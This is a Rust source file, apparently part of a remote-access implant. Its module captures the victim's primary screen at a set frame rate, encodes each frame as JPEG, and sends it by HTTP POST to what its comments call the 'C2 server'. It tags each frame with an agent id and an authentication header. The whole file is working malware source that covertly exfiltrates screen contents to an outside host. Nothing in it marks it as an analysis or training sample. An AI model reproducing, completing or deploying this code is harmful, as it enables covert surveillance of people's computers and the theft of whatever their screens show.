// desktop_streamer.rs — Rust port of DesktopStreamer.cs
// Captures desktop frames as JPEG and streams them via HTTP POST to the C2 server.

use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Mutex;
use std::time::{Duration, Instant};
use image::codecs::jpeg::JpegEncoder;
use log::{info, warn};

static IS_STREAMING: AtomicBool = AtomicBool::new(false);
static FRAMES_SENT: AtomicU64 = AtomicU64::new(0);

lazy_static::lazy_static! {
    static ref STREAMING_SINCE: Mutex<Option<Instant>> = Mutex::new(None);
}

pub struct DesktopStreamer;

impl DesktopStreamer {
    /// Start streaming desktop captures to the C2 server.
    ///
    /// # Arguments
    /// * `server_url` — Base URL of the C2 server
    /// * `auth_key` — Authentication key
    /// * `agent_id` — Agent identifier
    /// * `fps` — Target frames per second (1–10 typical)
    /// * `quality` — JPEG quality (1–100)
    pub fn start_streaming(
        server_url: &str,
        auth_key: &str,
        agent_id: &str,
        fps: u32,
        quality: u8,
    ) {
        if IS_STREAMING.load(Ordering::Relaxed) {
            info!("Already streaming.");
            return;
        }

        IS_STREAMING.store(true, Ordering::Relaxed);
        FRAMES_SENT.store(0, Ordering::Relaxed);
        *STREAMING_SINCE.lock().unwrap() = Some(Instant::now());

        let url = format!("{}/stream_frame", server_url);
        let key = auth_key.to_string();
        let id = agent_id.to_string();
        let interval = Duration::from_millis(1000 / fps.max(1) as u64);
        let q = quality.min(100).max(1);

        tokio::spawn(async move {
            let client = reqwest::Client::builder()
                .timeout(Duration::from_secs(10))
                .build()
                .unwrap();

            while IS_STREAMING.load(Ordering::Relaxed) {
                let frame_start = Instant::now();

                match capture_screen_jpeg(q) {
                    Ok(jpeg_data) => {
                        let send_url = format!("{}?id={}", url, id);
                        let result = client
                            .post(&send_url)
                            .header("X-Auth", &key)
                            .header("Content-Type", "image/jpeg")
                            .body(jpeg_data)
                            .send()
                            .await;

                        match result {
                            Ok(_) => {
                                FRAMES_SENT.fetch_add(1, Ordering::Relaxed);
                            }
                            Err(e) => {
                                warn!("Stream frame send error: {}", e);
                            }
                        }
                    }
                    Err(e) => {
                        warn!("Screen capture failed: {}", e);
                    }
                }

                // Maintain target framerate
                let elapsed = frame_start.elapsed();
                if elapsed < interval {
                    tokio::time::sleep(interval - elapsed).await;
                }
            }

            info!("Desktop streaming stopped. Total frames: {}", FRAMES_SENT.load(Ordering::Relaxed));
        });

        info!("Desktop streaming started at {} FPS, quality {}%", fps, quality);
    }

    pub fn stop_streaming() {
        IS_STREAMING.store(false, Ordering::Relaxed);
        *STREAMING_SINCE.lock().unwrap() = None;
    }

    pub fn is_streaming() -> bool {
        IS_STREAMING.load(Ordering::Relaxed)
    }

    pub fn get_status() -> String {
        if !IS_STREAMING.load(Ordering::Relaxed) {
            return "Desktop streaming is not active.".to_string();
        }

        let frames = FRAMES_SENT.load(Ordering::Relaxed);
        let duration = STREAMING_SINCE.lock().unwrap()
            .map(|start| start.elapsed().as_secs())
            .unwrap_or(0);

        let avg_fps = if duration > 0 {
            frames as f64 / duration as f64
        } else {
            0.0
        };

        format!(
            "Streaming: ACTIVE | Frames sent: {} | Duration: {}s | Avg FPS: {:.1}",
            frames, duration, avg_fps
        )
    }
}

/// Captures the screen and returns JPEG-encoded bytes.
fn capture_screen_jpeg(quality: u8) -> Result<Vec<u8>, String> {
    // Use the `screenshots` crate for cross-platform screen capture
    let screens = screenshots::Screen::all()
        .map_err(|e| format!("Failed to enumerate screens: {}", e))?;

    if screens.is_empty() {
        return Err("No screens available".to_string());
    }

    let screen = &screens[0]; // Primary screen
    let capture = screen.capture()
        .map_err(|e| format!("Screen capture failed: {}", e))?;

    let width = capture.width();
    let height = capture.height();
    let rgba_data = capture.as_raw();

    // Convert RGBA to RGB for JPEG encoding
    let mut rgb_data = Vec::with_capacity((width * height * 3) as usize);
    for pixel in rgba_data.chunks(4) {
        rgb_data.push(pixel[0]); // R
        rgb_data.push(pixel[1]); // G
        rgb_data.push(pixel[2]); // B
    }

    // Encode as JPEG
    let mut jpeg_buf = Vec::new();
    JpegEncoder::new_with_quality(&mut jpeg_buf, quality)
        .encode(&rgb_data, width, height, image::ExtendedColorType::Rgb8)
        .map_err(|e| format!("JPEG encode failed: {}", e))?;

    Ok(jpeg_buf)
}
